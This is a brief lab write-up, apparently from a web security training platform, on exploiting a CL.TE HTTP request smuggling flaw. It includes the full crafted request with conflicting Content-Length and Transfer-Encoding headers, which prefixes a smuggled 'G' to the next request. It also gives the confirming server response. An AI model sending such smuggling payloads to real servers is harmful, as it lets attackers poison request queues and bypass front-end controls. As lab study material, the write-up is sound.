CL.TE vulnerability

**Objective**: Smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`

```
POST / HTTP/1.1
Host: 0af8004d04a771ff80b7b734006e004c.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

This request causes the front-end to use the CL as the primary header while the back end expects another chunck to arrive.

Used Burp repeater to send multiple requests and some of the responses said: `Unrecognized method GPOST` confirming that I managed to smuggle a request with the `G`
